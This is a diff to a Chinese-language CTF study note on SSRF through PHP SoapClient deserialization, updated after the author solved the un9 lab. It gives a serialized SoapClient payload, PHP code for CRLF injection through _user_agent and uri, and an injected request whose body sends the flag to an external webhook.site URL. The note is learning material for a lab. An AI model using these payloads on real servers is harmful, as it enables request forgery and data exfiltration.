@@ -1,6 +1,6 @@
 # 08 · SSRF（服务端请求伪造）
 
-> 状态：🔄 进行中（从 un9/un92 实战中学到）
+> 状态：✅ 已通关（un9 已拿下，见 `writeups/unserialize-lab-un9.md`）
 
 ---
 
@@ -107,58 +107,105 @@ class SoapClient {
 O:10:"SoapClient":2:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/un92.php";}
 ```
 
+**⭐ 非 WSDL 模式**：第一个参数传 `null` → **任何方法都能调** → 全走 `__call`。
+
 **报错解读（用来探测）**：
 | 报错 | 含义 |
 |---|---|
 | `Error could not find "location" property` | 缺 `location` 属性 |
-| `looks like we got no XML document` | **有服务、有响应**（但非 XML） |
+| `Error finding "uri" property` | 缺 `uri` 属性 |
+| `looks like we got no XML document` | **请求成功了**（有服务、有响应，但非 XML）|
 | `[HTTP] Not Found` | 有服务，路径 404 |
 | `[HTTP] Could not connect to host` | 端口不通 |
+| `[HTTP] Bad request` | 400（通常是把 CRLF 塞进了 `location`）|
 | `Unknown protocol. Only http and https are allowed` | 协议被禁 |
 
-## 7.2 CRLF 注入（`uri` 属性）
+## 7.2 ⭐ 注入点决定能覆盖什么（**本题核心**）
 
-**原理**：`SoapClient` 把 `uri` 拼进 `SOAPAction` 头：
+**HTTP 头"首值优先"**：同名头出现两次时，**排在前面的赢**。
+
+→ **能不能覆盖一个头，不取决于你注入了什么，而取决于你的注入点排在第几。**
+
+**SoapClient 的属性 → 请求头的位置关系**：
+
+| 属性 | 变成什么头 | 相对 `Content-Type` 的位置 |
+|---|---|---|
+| **`_user_agent`** | **`User-Agent`** | ⭐ **之前**（能抢到 Content-Type）|
+| `uri` | `SOAPAction` | **之后**（抢不到）|
+| `location` | 请求行（URL） | —（塞 CRLF 会 400）|
+
+**实际请求头顺序**：
 ```http
-SOAPAction: "<uri>#<方法名>"
-```
-**`uri` 里含 `\r\n` → 可注入任意 HTTP 头！**
-
-**注入 Header**：
-```php
-$uri = "aaab\r\nX-Test-Injected: HELLO123";
+POST /un92.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: ...                    ← _user_agent 注入点
+Content-Type: text/xml; charset=utf-8   ← 目标头
+SOAPAction: "..."                  ← uri 注入点（晚了）
 ```
 
-**注入 POST body**：
+**结论**：
+- 想注入 **header**（如 `Cookie`）→ `uri` 就行
+- 想覆盖 **`Content-Type`** 并控制 **POST body**（表单场景）→ **必须用 `_user_agent`**
+
+## 7.3 ⚠️ 属性名有 PHP 版本差异（**大坑**）
+
+| PHP 版本 | UA 属性名 |
+|---|---|
+| **PHP 5.x** | **`_user_agent`**（带下划线）|
+| PHP 7.x | `user_agent` |
+
+- 网上文章基本都是 **PHP 7 写法** → 在 **PHP 5.5** 靶机上照抄 **完全无效**
+- **本地确认属性名的方法**：
+  ```php
+  <?php
+  $c = new SoapClient(null, array('location'=>'http://x/','uri'=>'y','user_agent'=>'UA'));
+  echo serialize($c);
+  // 输出里会出现： s:11:"_user_agent";s:2:"UA";   ← 按实际输出为准
+  ```
+- **构造函数里写 `user_agent`**（对外 API 不变），**序列化后自动变成 `_user_agent`**
+
+## 7.4 CRLF 注入（完整打法）
+
+**原理**：`\r\n` 能**提前结束当前头** → **插入新头** → **空行结束头部** → **塞 body**。
+
+**注入内容**：
 ```php
-$uri = "aaab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 17\r\n\r\nINJECTED_BODY=YES";
+$ua = "a\r\n"
+    . "Content-Type: application/x-www-form-urlencoded\r\n"
+    . "Content-Length: " . strlen($body) . "\r\n"
+    . "\r\n"
+    . $body;
 ```
-生成：
+
+**发出的请求**：
 ```http
-POST / HTTP/1.1
-Host: target
-User-Agent: PHP-SOAP/5.5.38
-Content-Type: text/xml; charset=utf-8        ← SoapClient 默认（在前）
-SOAPAction: "aaab                             ← 被截断
-Content-Type: application/x-www-form-urlencoded   ← 注入的
-Content-Length: 17
-                                              ← 空行
-INJECTED_BODY=YES                             ← body 被控制！
+POST /un92.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: a                                       ← 注入开始
+Content-Type: application/x-www-form-urlencoded     ← ⭐ 我们的，排第一，赢
+Content-Length: 75
+                                                    ← 空行，头结束
+py=flag&url=http://webhook.site/xxxx                ← body 可控
+Content-Type: text/xml; charset=utf-8               ← SoapClient 原本的，掉进 body 区被忽略
+SOAPAction: "x#pyflag"
+Content-Length: 370
 ```
+**→ PHP 按表单解析 → `$_POST` 有值。**
 
-**注入 Cookie**：
+**注入 Cookie（用 `uri`）**：
 ```php
 $uri = "aaab\r\nCookie: py=flag; url=xxx\r\nX: ";
-// 末尾的 \r\nX: 用来把 "uri#方法名" 的垃圾挡进下一个头
+// 末尾的 \r\nX: 用来把 "uri#方法名" 的垃圾挡进下一个头（HTTP 头续行/无效头）
 ```
 
-## 7.3 各属性有效性（**PHP 5.5 实测**）
+## 7.5 ⚠️ 序列化格式差异
 
-| 属性 | 是否可注入 | 说明 |
+| PHP 版本 | 属性可见性 | 序列化样子 |
 |---|---|---|
-| **`uri`** | ✅ **有效** | 拼进 `SOAPAction` |
-| `location` | ❌ | 不能注入 CRLF（会被当 URL 的一部分 → 404） |
-| `user_agent` | ❌ **无效** | UA 固定 `PHP-SOAP/5.5.38`（网上写法是 PHP 7 的） |
+| PHP 5.x | public | `s:11:"_user_agent";` ✅ 简洁 |
+| PHP 8.x | private | `s:15:"\0SoapClient\0uri";`（36 个属性，不兼容）|
+
+**→ 必须用 PHP 5.4 生成，或手写。**
 
 **⚠️ 协议限制**：只允许 `http` / `https`（`gopher://`、`dict://`、`php://` 全被禁）。
 
@@ -181,15 +228,30 @@ $uri = "aaab\r\nCookie: py=flag; url=xxx\r\nX: ";
 https://webhook.site/token/<uuid>/requests?sorting=newest&per_page=5
 ```
 
-**验证清单**：
-| 验证什么 | 怎么做 |
-|---|---|
-| 请求能不能发出 | `location` 指向 webhook |
-| CRLF 注入是否生效 | 注入 `X-Test: xxx`，看 header |
-| body 是否可控 | 注入 `Content-Length` + body，看 `content` 字段 |
+## 4 级验证阶梯（每步都必须现象对了再往下）
+
+| 级别 | 做什么 | 验证点 |
+|---|---|---|
+| **1** | `location=http://127.0.0.1/un92.php`，不注入 | `no XML document` = **SSRF 通了** |
+| **2** | 注入 `_user_agent = "MYUA\r\nX-Test: HELLO"`，`location=webhook` | webhook 里 `user-agent: MYUA` + 多出 `x-test` = **注入生效** |
+| **3** | 注入完整 Content-Type + Length + body，`location=webhook` | webhook 里 `content=py=flag&url=...`、`content-type` 是表单 = **body 可控** |
+| **4** | 同上，但 `location=http://127.0.0.1/un92.php` | webhook 里出现 `?flag=...` = **🚩 完成** |
 
 ---
 
-# 九、一句话
+# 九、踩坑速查
 
-> **SSRF = 让服务器代替你发请求**。**`REMOTE_ADDR` 是 TCP 层，改不了 → 必须 SSRF**。**`SoapClient` 的 `__call` 是反序列化场景的 SSRF 入口**。**`uri` 属性可 CRLF 注入任意头 + POST body**（**PHP 5.5 的 `user_agent` 无效**）。**验证用 webhook.site**。
+| 坑 | 现象 | 原因 | 解决 |
+|---|---|---|---|
+| 属性名写成 `user_agent` | UA 不变，注入无效 | PHP 5.x 是 `_user_agent` | 用 `_user_agent` |
+| 只用 `uri` 注入 | body 塞进去了，但对方收不到参数 | `SOAPAction` 排在 `Content-Type` 后，首值优先覆盖不了 | 改用 `_user_agent` |
+| 用 PHP 8 生成 payload | 36 个 private 属性 | 格式不兼容 | 用 PHP 5.4 或手写 |
+| curl 直接发 URL | 响应里 `"` `{}` 消失 | curl 的 `{}` URL globbing | URL 编码 / `curl -g` |
+| 参数写在 query | 目标不响应 | 目标只认 `$_POST` | 必须注入 body |
+| `location` 塞 CRLF | `400 Bad Request` | 破坏请求行 | 只能从 `_user_agent`/`uri` 注入 |
+
+---
+
+# 十、一句话
+
+> **SSRF = 让服务器代替你发请求**。**`REMOTE_ADDR` 是 TCP 层，改不了 → 必须 SSRF**。**`SoapClient` 的 `__call` 是反序列化场景的 SSRF 入口**。**能不能覆盖 `Content-Type`，看注入点排第几：`_user_agent` 在前（赢），`uri` 在后（输）**。**属性名 PHP 5 是 `_user_agent`、PHP 7 是 `user_agent`**。**验证用 webhook.site，4 级阶梯逐步确认**。
